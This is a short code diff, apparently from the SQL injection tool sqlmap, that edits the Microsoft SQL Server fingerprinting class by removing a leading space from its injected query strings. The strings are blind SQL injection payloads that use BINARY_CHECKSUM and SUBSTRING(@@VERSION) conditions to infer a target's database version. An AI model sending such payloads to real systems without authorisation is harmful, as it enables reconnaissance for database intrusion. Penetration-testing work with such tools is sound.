@@ -90,7 +90,7 @@ class Fingerprint(GenericFingerprint):
             result = True
         else:
             randInt = randomInt()
-            payload = agent.fullPayload(" AND BINARY_CHECKSUM(%d)=BINARY_CHECKSUM(%d)" % (randInt, randInt))
+            payload = agent.fullPayload("AND BINARY_CHECKSUM(%d)=BINARY_CHECKSUM(%d)" % (randInt, randInt))
             result  = Request.queryPage(payload)
 
         if result:
@@ -99,10 +99,10 @@ class Fingerprint(GenericFingerprint):
 
             for version in (0, 5, 8):
                 randInt = randomInt()
-                query   = " AND %d=(SELECT (CASE WHEN (( SUBSTRING((@@VERSION), 22, 1)=2 AND SUBSTRING((@@VERSION), 25, 1)=%d ) OR ( SUBSTRING((@@VERSION), 23, 1)=2 AND SUBSTRING((@@VERSION), 26, 1)=%d )) THEN %d ELSE %d END))" % (randInt, version, version, randInt, (randInt + 1))
+                query   = "AND %d=(SELECT (CASE WHEN (( SUBSTRING((@@VERSION), 22, 1)=2 AND SUBSTRING((@@VERSION), 25, 1)=%d ) OR ( SUBSTRING((@@VERSION), 23, 1)=2 AND SUBSTRING((@@VERSION), 26, 1)=%d )) THEN %d ELSE %d END))" % (randInt, version, version, randInt, (randInt + 1))
 
                 if conf.direct:
-                    query = query.replace(" AND ", "SELECT 1 WHERE ", 1)
+                    query = query.replace("AND ", "SELECT 1 WHERE ", 1)
 
                 payload = agent.fullPayload(query)
                 result  = Request.queryPage(payload)
@@ -124,7 +124,7 @@ class Fingerprint(GenericFingerprint):
                         break
 
                     else:
-                        query   = " AND %d=(SELECT (CASE WHEN (SUBSTRING((@@VERSION), 22, 1)=7) THEN %d ELSE %d END))" % (randInt, randInt, (randInt + 1))
+                        query   = "AND %d=(SELECT (CASE WHEN (SUBSTRING((@@VERSION), 22, 1)=7) THEN %d ELSE %d END))" % (randInt, randInt, (randInt + 1))
                         payload = agent.fullPayload(query)
                         result  = Request.queryPage(payload)
 
